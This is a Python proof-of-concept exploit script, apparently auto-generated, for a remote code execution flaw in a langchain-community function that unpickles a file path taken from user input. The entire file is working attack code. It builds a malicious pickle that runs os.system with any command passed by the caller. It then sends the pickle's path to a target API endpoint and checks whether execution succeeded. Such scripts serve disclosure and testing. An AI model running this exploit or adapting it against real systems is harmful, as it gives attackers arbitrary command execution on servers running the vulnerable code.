#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-020
# Sink: _send_pipeline_to_device
# Auto-generated — run with: python3 rce_who_control_pipeline__send_pipeline_to_device_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only RCE vulnerability.

Vulnerability: _send_pipeline_to_device accepts a 'pipeline' parameter.
If it's a string, it opens the file and deserializes it with pickle.load,
allowing arbitrary code execution via a malicious pickle file.

This PoC:
1. Creates a malicious pickle file that executes a benign command
2. Triggers the vulnerable function with the path to this file
3. Demonstrates code execution by creating a marker file
"""

import os
import sys
import pickle
import tempfile
import requests
import argparse
import subprocess
from typing import Optional

# Configuration - modify these as needed
TARGET_URL = "http://localhost:8000"  # Default target URL
ENDPOINT = "/api/v1/trigger"  # Endpoint that calls the vulnerable function
MARKER_FILE = "/tmp/poc_success.txt"  # File created to prove RCE

def create_malicious_pickle(command: str) -> str:
    """
    Create a malicious pickle file that executes the given command.
    
    The pickle exploits __reduce__ to execute arbitrary code during
    deserialization. We use a benign command by default.
    
    Args:
        command: Shell command to execute
        
    Returns:
        Path to the created pickle file
    """
    class MaliciousPickle:
        def __reduce__(self):
            return (os.system, (command,))
    
    # Create temporary file
    fd, path = tempfile.mkstemp(suffix='.pkl')
    os.close(fd)
    
    # Write malicious pickle
    with open(path, 'wb') as f:
        pickle.dump(MaliciousPickle(), f)
    
    print(f"[+] Created malicious pickle file at: {path}")
    print(f"[+] Payload command: {command}")
    return path

def trigger_vulnerability(target_url: str, pickle_path: str) -> Optional[requests.Response]:
    """
    Trigger the vulnerable function by sending the pickle file path.
    
    The vulnerable function _send_pipeline_to_device will:
    1. Receive the pipeline parameter (our pickle path)
    2. Open the file
    3. Deserialize it with pickle.load
    4. Execute our malicious code
    
    Args:
        target_url: Base URL of the target
        pickle_path: Path to malicious pickle file
        
    Returns:
        Response object or None on failure
    """
    endpoint = f"{target_url.rstrip('/')}{ENDPOINT}"
    
    # The vulnerable function expects a string path to a pickle file
    # We send the path as the untrusted user input
    payload = {"untrusted_user_input": pickle_path}
    
    print(f"[*] Sending request to: {endpoint}")
    print(f"[*] Payload: {payload}")
    
    try:
        response = requests.post(
            endpoint,
            json=payload,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        print(f"[+] Response status: {response.status_code}")
        print(f"[+] Response body: {response.text[:500]}")
        return response
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {endpoint}")
        print("[-] Make sure the target server is running")
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return None

def verify_exploit() -> bool:
    """
    Verify if the exploit was successful by checking for the marker file.
    
    Returns:
        True if marker file exists, False otherwise
    """
    if os.path.exists(MARKER_FILE):
        print(f"[+] SUCCESS! Marker file created: {MARKER_FILE}")
        print("[+] Code execution confirmed!")
        return True
    else:
        print(f"[-] Marker file not found: {MARKER_FILE}")
        print("[-] Exploit may have failed or command was not executed")
        return False

def cleanup(pickle_path: str):
    """
    Clean up temporary files.
    
    Args:
        pickle_path: Path to the pickle file to remove
    """
    try:
        if os.path.exists(pickle_path):
            os.remove(pickle_path)
            print(f"[*] Cleaned up pickle file: {pickle_path}")
        if os.path.exists(MARKER_FILE):
            os.remove(MARKER_FILE)
            print(f"[*] Cleaned up marker file: {MARKER_FILE}")
    except Exception as e:
        print(f"[-] Cleanup error: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for langchain-community RCE vulnerability"
    )
    parser.add_argument(
        "-t", "--target",
        default=TARGET_URL,
        help=f"Target URL (default: {TARGET_URL})"
    )
    parser.add_argument(
        "-c", "--command",
        default=f"touch {MARKER_FILE}",
        help="Command to execute (default: touch marker file)"
    )
    parser.add_argument(
        "--no-cleanup",
        action="store_true",
        help="Don't clean up temporary files after execution"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("langchain-community RCE PoC Exploit")
    print("=" * 60)
    print()
    
    # Step 1: Create malicious pickle file
    print("[*] Step 1: Creating malicious pickle file...")
    pickle_path = create_malicious_pickle(args.command)
    
    # Step 2: Trigger the vulnerability
    print("\n[*] Step 2: Triggering vulnerability...")
    response = trigger_vulnerability(args.target, pickle_path)
    
    # Step 3: Verify exploit
    print("\n[*] Step 3: Verifying exploit...")
    success = verify_exploit()
    
    # Step 4: Cleanup
    if not args.no_cleanup:
        print("\n[*] Step 4: Cleaning up...")
        cleanup(pickle_path)
    
    print("\n" + "=" * 60)
    if success:
        print("[+] EXPLOIT SUCCESSFUL!")
        print(f"[+] Command executed: {args.command}")
        print(f"[+] Marker file: {MARKER_FILE}")
    else:
        print("[-] EXPLOIT FAILED")
        print("[-] Check that the target is running and accessible")
        print("[-] Verify the endpoint path matches the actual API")
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())
